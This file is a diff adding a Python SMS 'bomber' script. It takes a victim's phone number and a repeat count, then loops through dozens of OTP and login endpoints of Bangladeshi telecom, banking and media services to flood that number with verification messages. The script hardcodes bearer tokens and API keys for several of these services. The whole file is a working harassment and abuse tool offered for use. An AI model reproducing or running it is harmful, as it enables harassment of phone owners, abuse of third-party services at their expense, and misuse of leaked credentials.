@@ -1,0 +1,809 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+
+import requests, os, time, sys, smtplib
+
+blue = '\x1b[94m'
+lightblue = '\x1b[94m'
+red = '\x1b[91m'
+white = '\x1b[97m'
+green = '\x1b[93m'
+green = '\x1b[1;32m'
+cyan = '\x1b[96m'
+end = '\x1b[0m'
+yellow = '\n\n\x1b[1;93m'
+os.system('clear')
+logo='''
+ 	    \x1b[1;93m
+
+
+───────────────────────────────────────
+─██████████████─██████──────────██████─
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──────────██▒▒██─
+─██▒▒██████▒▒██─██▒▒██──────────██▒▒██─
+─██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─
+─██▒▒██████▒▒██─██▒▒██──██████──██▒▒██─
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██──██▒▒██─
+─██▒▒██████▒▒██─██▒▒██──██▒▒██──██▒▒██─
+─██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─
+─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
+─██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─
+─██████──██████─██████──██████──██████─
+───────────────────────────────────────
+ 	    \x1b[91m
+
+───────────────────────────────
+─██████──██████─██████████████─
+─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
+─██▒▒██──██▒▒██─██▒▒██████▒▒██─
+─██▒▒██──██▒▒██─██▒▒██──██▒▒██─
+─██▒▒██──██▒▒██─██▒▒██████▒▒██─
+─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
+─██▒▒██──██▒▒██─██▒▒██████▒▒██─
+─██▒▒▒▒██▒▒▒▒██─██▒▒██──██▒▒██─
+─████▒▒▒▒▒▒████─██▒▒██──██▒▒██─
+───████▒▒████───██▒▒██──██▒▒██─
+─────██████─────██████──██████─
+───────────────────────────────
+ 	    \x1b[1;32m
+
+
+───────────────────────────────────
+─████████████████───██████──██████─
+─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒██──██▒▒██─
+─██▒▒████████▒▒██───██▒▒██──██▒▒██─
+─██▒▒██────██▒▒██───██▒▒██──██▒▒██─
+─██▒▒████████▒▒██───██▒▒██████▒▒██─
+─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─
+─██▒▒██████▒▒████───██▒▒██████▒▒██─
+─██▒▒██──██▒▒██─────██▒▒██──██▒▒██─
+─██▒▒██──██▒▒██████─██▒▒██──██▒▒██─
+─██▒▒██──██▒▒▒▒▒▒██─██▒▒██──██▒▒██─
+─██████──██████████─██████──██████─
+───────────────────────────────────
+ 	    \x1b[1;93m
+
+───────────────────────
+─██████████─██████████─
+─██▒▒▒▒▒▒██─██▒▒▒▒▒▒██─
+─████▒▒████─████▒▒████─
+───██▒▒██─────██▒▒██───
+───██▒▒██─────██▒▒██───
+───██▒▒██─────██▒▒██───
+───██▒▒██─────██▒▒██───
+───██▒▒██─────██▒▒██───
+─████▒▒████─████▒▒████─
+─██▒▒▒▒▒▒██─██▒▒▒▒▒▒██─
+─██████████─██████████─
+───────────────────────
+ 	    \x1b[91m
+
+───────────────────────────────
+─██████─────────████████████───
+─██▒▒██─────────██▒▒▒▒▒▒▒▒████─
+─██▒▒██─────────██▒▒████▒▒▒▒██─
+─██▒▒██─────────██▒▒██──██▒▒██─
+─██▒▒██─────────██▒▒██──██▒▒██─
+─██▒▒██─────────██▒▒██──██▒▒██─
+─██▒▒██─────────██▒▒██──██▒▒██─
+─██▒▒██─────────██▒▒██──██▒▒██─
+─██▒▒██████████─██▒▒████▒▒▒▒██─
+─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─
+─██████████████─████████████───
+───────────────────────────────
+ 	    \x1b[1;3    𝗔𝗩𝗥𝗜𝗜𝗟 𝗩𝗦 𝗪𝗔𝗛𝗜𝗜𝗗 '''+end
+logo_2='''\x1b[93m         --------------------------------------\n\x1b[96m		     **AvrilvsWahid BOMBER**  \n\x1b[1;32m	          Author  :     AvRiiiLvsWaHiiiD \n\x1b[91m             	  Facebook: 	Md Wahiid \n\x1b[1;32m	          Github  :     AvrilvsWahid \n\x1b[1;93m         --------------------------------------
+'''
+def logoprint(AvRiiiLvsWaHiiiD):
+    for word in AvRiiiLvsWaHiiiD + '\n':
+        sys.stdout.write(word)
+        sys.stdout.flush()
+        time.sleep(0.03)
+        
+os.system('clear')
+print(logo)
+logoprint(logo_2)
+
+    
+
+
+  
+
+print ("	 -!-!- WeLcOmE-!-!- (AvRiiiLvsWaHiiiD WorLd ) ")
+
+print ("	 -!-!- WeLcOmE-!-!- ( AvRiiLvsWaHiD ) ( @##AvRiiiLvsWaHiiiD##@ ) ")
+
+
+
+
+number  = str(input("[>] HeY AvRiLvsWaHiD  apNadEr aTTack NumBer DiN: "))
+
+
+amount = int(input("[>] AvRiLvsWaHiD  apNadEr aTTack ar PoriMaN LikHuN: "))
+
+#Get Token
+
+token = str(input("[>] Enter Airtel Token: "))
+
+
+url1 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = "phone_number="+number
+
+
+url2 = "http://27.131.15.19/lstyle/api/lsotprequest"
+
+headers2 = CaseInsensitiveDict()
+
+headers2["Content-Length"]="48"
+
+headers2["Content-Type"]="application/json;charset=utf-8"
+
+data2 = """{
+  \"shortcode\": \"2494905\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+
+
+
+
+url3 = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
+
+headers3 = CaseInsensitiveDict()
+
+headers3["X-Authorization"]= "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
+
+headers3["Content-Type"] = "application/json"
+
+data3 = '{"mobile_number":"'+number+'","referral":false}'
+
+url4 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers4 = CaseInsensitiveDict()
+
+headers4["Content-Type"]="application/json; charset=UTF-8"
+
+data4 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+
+url5 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers5 = CaseInsensitiveDict()
+
+headers5["Content-Type"]="application/json; charset=UTF-8"
+
+data5 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+url6 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers6 = CaseInsensitiveDict()
+headers6["Content-Type"] = "application/x-www-form-urlencoded"
+
+data6 = "phone_number="+number
+
+url7 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers7 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data7 = "phone_number="+number
+
+
+url8 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers8 = CaseInsensitiveDict()
+headers8["Content-Type"] = "application/x-www-form-urlencoded"
+
+data8 = "phone_number="+number
+
+url9 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers9 = CaseInsensitiveDict()
+headers9["Content-Type"] = "application/x-www-form-urlencoded"
+
+data9 = "phone_number="+number
+
+url10 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers10 = CaseInsensitiveDict()
+
+headers10["Content-Type"]="application/json; charset=UTF-8"
+
+data10 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+url11 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers11 = CaseInsensitiveDict()
+
+headers11["Content-Type"]="application/json; charset=UTF-8"
+
+data11 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+
+url12 = "https://ss.binge.buzz/otp/send/login"
+
+headers12 = CaseInsensitiveDict()
+headers12["Content-Type"] = "application/x-www-form-urlencoded"
+
+data12 = "phone="+number
+
+
+url13 = "https://ss.binge.buzz/otp/send/login"
+
+headers13 = CaseInsensitiveDict()
+headers13["Content-Type"] = "application/x-www-form-urlencoded"
+
+data13 = "phone="+number
+
+url14 = "https://ss.binge.buzz/otp/send/login"
+
+headers14 = CaseInsensitiveDict()
+headers14["Content-Type"] = "application/x-www-form-urlencoded"
+
+data14 = "phone="+number
+url15 = "https://webapi.robi.com.bd/v1/otp/send_request"
+
+headers15 = CaseInsensitiveDict()
+headers15["Content-Type"] = "application/json"
+
+headers15["Authorization"] = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1MzkwMzA0MiwiZXhwIjoxNjUzOTg5NDQyLCJuYmYiOjE2NTM5MDMwNDIsImp0aSI6Im4xSUQ2cnNKTUxQNXI2OFEiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.HmVcoj90s3wzvGS5fqo4e4__JX6MLpzsX8H7YdGkg_Q"
+
+
+data15 = '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"}'
+
+
+url16 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
+
+url17 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
+
+url18 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
+
+url19 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
+
+url20 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
+
+url21 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers21 = CaseInsensitiveDict()
+headers21["Content-Type"] = "application/json"
+headers21["Authorization"] = "Bearer "+token+""
+data21 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"7c6583ee-4729-4b45-9d69-199f9291b570"}'
+
+
+
+
+
+
+
+
+
+url22 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers22 = CaseInsensitiveDict()
+headers22["Content-Type"] = "application/json"
+headers22["Authorization"] = "Bearer "+token+""
+data22 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"c112de22-3d3a-41e5-b05a-163864e65314"}'
+
+
+
+
+
+
+
+
+url23 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers23 = CaseInsensitiveDict()
+headers23["Content-Type"] = "application/json"
+headers23["Authorization"] = "Bearer "+token+""
+data23 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"ec972aac-e838-413c-999e-0a5fd4c1254d"}'
+
+
+
+
+
+
+
+
+url24 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers24 = CaseInsensitiveDict()
+headers24["Content-Type"] = "application/json"
+headers24["Authorization"] = "Bearer "+token+""
+data24 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"7ddd1992-8fb7-43e2-9997-9a0207eb3c41"}'
+
+
+
+
+
+
+
+
+
+
+
+url25 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers25 = CaseInsensitiveDict()
+headers25["Content-Type"] = "application/json"
+headers25["Authorization"] = "Bearer "+token+""
+data25 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"e15f31a9-233e-4f87-a253-a16717cdfb8c"}'
+
+
+
+
+
+
+
+
+url26 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers26 = CaseInsensitiveDict()
+headers26["Content-Type"] = "application/json"
+headers26["Authorization"] = "Bearer "+token+""
+data26 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"b092d0b7-0038-4421-9a80-6f87dbe69fdb"}'
+
+
+
+
+url27 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers27 = CaseInsensitiveDict()
+headers27["Content-Type"] = "application/json"
+headers27["Authorization"] = "Bearer "+token+""
+data27 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"64438b6b-b5ab-4bd0-9907-dd5de55feee7"}'
+
+
+
+
+
+
+
+
+url28 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers28 = CaseInsensitiveDict()
+headers28["Content-Type"] = "application/json"
+headers28["Authorization"] = "Bearer "+token+""
+data28 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"21588e81-3610-41d3-a2e5-bfd27dc5d6f1"}'
+
+
+
+
+
+
+url29 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers29 = CaseInsensitiveDict()
+headers29["Content-Type"] = "application/json"
+headers29["Authorization"] = "Bearer "+token+""
+data29 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"f62647b9-afb6-4538-82f8-5e4d505bea0d"}'
+
+
+
+
+
+
+url30 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers30 = CaseInsensitiveDict()
+headers30["Content-Type"] = "application/json"
+headers30["Authorization"] = "Bearer "+token+""
+data30 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"60f03fff-15fa-4864-bef9-7be90fbbdec3"}'
+
+
+
+
+
+
+
+url31 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers31 = CaseInsensitiveDict()
+headers31["Content-Type"] = "application/json"
+headers31["Authorization"] = "Bearer "+token+""
+data31 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"d03e5ceb-3bc1-46db-917d-73a1ac96d944"}'
+
+
+
+
+
+url32 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers32 = CaseInsensitiveDict()
+headers32["Content-Type"] = "application/json"
+headers32["Authorization"] = "Bearer "+token+""
+data32 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"d03e5ceb-3bc1-46db-917d-73a1ac96d944"}'
+
+
+
+
+
+url33 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+
+
+headers33 = CaseInsensitiveDict()
+headers33["Content-Type"] = "application/json"
+headers33["Authorization"] = "Bearer "+token+""
+data33 = '{"phone_number":"'+number+'","lang":"en","type":"offer","plan_type":"offer","uid":"d03e5ceb-3bc1-46db-917d-73a1ac96d944"}'
+
+
+
+
+
+
+
+url34 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers34 = CaseInsensitiveDict()
+headers34["Content-Type"] = "application/json"
+headers34["Authorization"] = "Bearer "+token+""
+data34 = '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"08f75d74-fe7b-4bc0-ae32-24eca55bc157"}'
+
+url35 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers35 = CaseInsensitiveDict()
+headers35["Content-Type"] = "application/json"
+headers35["Authorization"] = "Bearer "+token+""
+data35 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"7c6583ee-4729-4b45-9d69-199f9291b570"}'
+
+
+
+
+
+
+
+
+
+url36 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers36 = CaseInsensitiveDict()
+headers36["Content-Type"] = "application/json"
+headers36["Authorization"] = "Bearer "+token+""
+data36 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"c112de22-3d3a-41e5-b05a-163864e65314"}'
+
+
+
+
+
+
+
+
+url37 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers37 = CaseInsensitiveDict()
+headers37["Content-Type"] = "application/json"
+headers37["Authorization"] = "Bearer "+token+""
+data37 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"ec972aac-e838-413c-999e-0a5fd4c1254d"}'
+
+
+
+
+
+
+
+
+url38 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers38 = CaseInsensitiveDict()
+headers38["Content-Type"] = "application/json"
+headers38["Authorization"] = "Bearer "+token+""
+data38 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"7ddd1992-8fb7-43e2-9997-9a0207eb3c41"}'
+
+
+
+
+
+
+
+
+
+
+
+url39 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers39 = CaseInsensitiveDict()
+headers39["Content-Type"] = "application/json"
+headers39["Authorization"] = "Bearer "+token+""
+data39 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"e15f31a9-233e-4f87-a253-a16717cdfb8c"}'
+
+
+
+
+
+
+
+
+url40 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers40 = CaseInsensitiveDict()
+headers40["Content-Type"] = "application/json"
+headers40["Authorization"] = "Bearer "+token+""
+data40 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"b092d0b7-0038-4421-9a80-6f87dbe69fdb"}'
+
+
+
+
+url41 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers41 = CaseInsensitiveDict()
+headers41["Content-Type"] = "application/json"
+headers41["Authorization"] = "Bearer "+token+""
+data41 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"64438b6b-b5ab-4bd0-9907-dd5de55feee7"}'
+
+
+
+
+
+
+
+
+url42 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers42 = CaseInsensitiveDict()
+headers42["Content-Type"] = "application/json"
+headers42["Authorization"] = "Bearer "+token+""
+data42 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"21588e81-3610-41d3-a2e5-bfd27dc5d6f1"}'
+
+
+
+
+
+
+url43 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers43 = CaseInsensitiveDict()
+headers43["Content-Type"] = "application/json"
+headers43["Authorization"] = "Bearer "+token+""
+data43 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"f62647b9-afb6-4538-82f8-5e4d505bea0d"}'
+
+
+
+
+
+
+url44 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers44 = CaseInsensitiveDict()
+headers44["Content-Type"] = "application/json"
+headers44["Authorization"] = "Bearer "+token+""
+data44 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"60f03fff-15fa-4864-bef9-7be90fbbdec3"}'
+
+
+
+
+
+
+
+url45 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers45 = CaseInsensitiveDict()
+headers45["Content-Type"] = "application/json"
+headers45["Authorization"] = "Bearer "+token+""
+data45 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"d03e5ceb-3bc1-46db-917d-73a1ac96d944"}'
+
+
+
+
+
+url46 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers46 = CaseInsensitiveDict()
+headers46["Content-Type"] = "application/json"
+headers46["Authorization"] = "Bearer "+token+""
+data46 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"d03e5ceb-3bc1-46db-917d-73a1ac96d944"}'
+
+
+
+
+
+url47 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+
+
+headers47 = CaseInsensitiveDict()
+headers47["Content-Type"] = "application/json"
+headers47["Authorization"] = "Bearer "+token+""
+data47 = '{"phone_number":"'+number+'","lang":"bn","type":"offer","plan_type":"offer","uid":"d03e5ceb-3bc1-46db-917d-73a1ac96d944"}'
+
+
+
+
+
+
+
+url48 = "https://api.bd.airtel.com/v1/otp/send_request"
+
+headers48 = CaseInsensitiveDict()
+headers48["Content-Type"] = "application/json"
+headers48["Authorization"] = "Bearer "+token+""
+data48 = '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"08f75d74-fe7b-4bc0-ae32-24eca55bc157"}'
+
+
+url49 = "http://api.myguardianbd.com:80/api/requestOtp"
+
+headers49 = CaseInsensitiveDict()
+headers49["Content-Type"] = "application/x-www-form-urlencoded"
+
+headers49["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"
+
+data49 = "new=1&device_id=40d4801634a656ee&mobile="+number
+
+
+url50 = "http://api.myguardianbd.com:80/api/requestOtp"
+
+headers50 = CaseInsensitiveDict()
+headers50["Content-Type"] = "application/x-www-form-urlencoded"
+
+headers50["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"
+
+data50 = "new=1&device_id=40d4801634a656ee&mobile="+number
+
+
+url51 = "http://api.myguardianbd.com:80/api/requestOtp"
+
+headers51 = CaseInsensitiveDict()
+headers51["Content-Type"] = "application/x-www-form-urlencoded"
+
+headers51["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"
+
+data51 = "new=1&device_id=40d4801634a656ee&mobile="+number
+
+
+url52 = "http://api.myguardianbd.com:80/api/requestOtp"
+
+headers52 = CaseInsensitiveDict()
+headers52["Content-Type"] = "application/x-www-form-urlencoded"
+
+headers52["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"
+
+data52 = "new=1&device_id=40d4801634a656ee&mobile="+number
+
+
+url53 = "http://api.myguardianbd.com:80/api/requestOtp"
+
+headers53 = CaseInsensitiveDict()
+headers53["Content-Type"] = "application/x-www-form-urlencoded"
+
+headers53["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"
+
+data53 = "new=1&device_id=40d4801634a656ee&mobile="+number
+
+
+
+
+url54 = "http://api.myguardianbd.com:80/api/requestOtp"
+
+headers54 = CaseInsensitiveDict()
+headers54["Content-Type"] = "application/x-www-form-urlencoded"
+
+headers54["Authorization"] = "Bearer 7dd7c79eaa1ac79a1f65ce1234aae70b34434cbab673a4bd19563b83192h76a5621ce7b3c3c8662c51df329b203cb0c987b2"
+
+data54 = "new=1&device_id=40d4801634a656ee&mobile="+number
+
+
+for i in range(amount):
+	try:
+		resp1 = requests.post(url1, headers=headers1, data=data1)
+
+		
+		resp2 = requests.post(url2, headers=headers2, data=data2)				
+								
+	
+		
+		resp3 = requests.post(url3, headers=headers3, data=data3)
+		
+		resp4 = requests.post(url4, headers=headers4, data=data4)
+
+		resp5 = requests.post(url5, headers=headers5, data=data5)
+		
+		resp6 = requests.post(url6, headers=headers5, data=data6)
+		
+		resp7 = requests.post(url7, headers=headers7, data=data7)
+		
+		resp8 = requests.post(url8, headers=headers8, data=data8)
+		
+		resp9 = requests.post(url9, headers=headers9, data=data9)
+		
+		resp10 = requests.post(url10, headers=headers10, data=data10)
+		
+		resp11 = requests.post(url11, headers=headers11, data=data11)
+		
+		resp12 = requests.post(url12, headers=headers12, data=data12)
+		
+		resp13 = requests.post(url13, headers=headers13, data=data13)
+		
+		resp14 = requests.post(url14, headers=headers14, data=data14)
+		
+		resp15 = requests.post(url15, headers=headers15, data=data15)
+		
+		resp16 = requests.get(url15)
+		
+		resp17 = requests.get(url17)
+		
+		resp18 = requests.get(url18)
+		
+		resp19 = requests.get(url19)
+		
+		resp20 = requests.get(url20)
+		
+		resp21 = requests.post(url21, headers=headers21, data=data31)
+		
+		resp21 = requests.post(url21, headers=headers21, data=data31)
+
+		
+		resp22 = requests.post(url22, headers=headers22, data=data22)				
+								
+		resp23 = requests.post(url23, headers=headers23, data=data23)
+		
+		resp24 = requests.post(url24, headers=headers24, data=data24)
+
+		resp25 = requests.post(url25, headers=headers25, data=data25)
+		
+		resp26 = requests.post(url26, headers=headers26, data=data26)
+		
+		resp27 = requests.post(url27, headers=headers27, data=data27)
+		
+		resp28 = requests.post(url28, headers=headers28, data=data28)
+		
+		resp29 = requests.post(url29, headers=headers29, data=data29)
+		
+		resp30 = requests.post(url30, headers=headers30, data=data30)
+		
+		resp31 = requests.post(url31, headers=headers31, data=data31)
+		
+		resp32 = requests.post(url32, headers=headers32, data=data32)
+		
+		resp33 = requests.post(url33, headers=headers33, data=data33)
+		
+		resp34 = requests.post(url34, headers=headers34, data=data34)
+		
+		resp35 = requests.post(url35, headers=headers35, data=data35)
+		
+		resp36 = requests.post(url36, headers=headers36, data=data36)
+		
+		resp37 = requests.post(url37, headers=headers37, data=data37)
+		
+		resp38 = requests.post(url38, headers=headers38, data=data38)
+		
+		resp39 = requests.post(url39, headers=headers39, data=data39)
+		
+		resp40 = requests.post(url40, headers=headers40, data=data40)
+		
+		resp41 = requests.post(url41, headers=headers41, data=data41)
+		
+		resp22 = requests.post(url22, headers=headers42, data=data42)
+		
+		resp43 = requests.post(url43, headers=headers43, data=data43)
+		
+		resp44 = requests.post(url44, headers=headers44, data=data44)
+		
+		resp45 = requests.post(url45, headers=headers45, data = data45)
+		
+		resp46 = requests.post(url46, headers=headers46, data = data46)
+		
+		resp47 = requests.post(url47, headers=headers47, data = data47)
+		
+		resp48 = requests.post(url48, headers=headers48, data = data48)
+		
+		resp49 = requests.post(url49, headers=headers49, data = data49)
+		
+		resp50 = requests.post(url50, headers=headers50, data = data50)
+		
+		resp51 = requests.post(url51, headers=headers51, data = data51)
+		
+		resp52 = requests.post(url52, headers=headers52, data = data52)
+		
+		resp53 = requests.post(url53, headers=headers53, data = data53)
+		
+		resp54 = requests.post(url54, headers=headers54, data = data54)
+		
+		print(str (i+1)+"  HeY AvRiLvsWaHiD PiiN SeNT HoYeChE \n")
+	except:
+		print ("Please Make Sure Your Internet Connection")
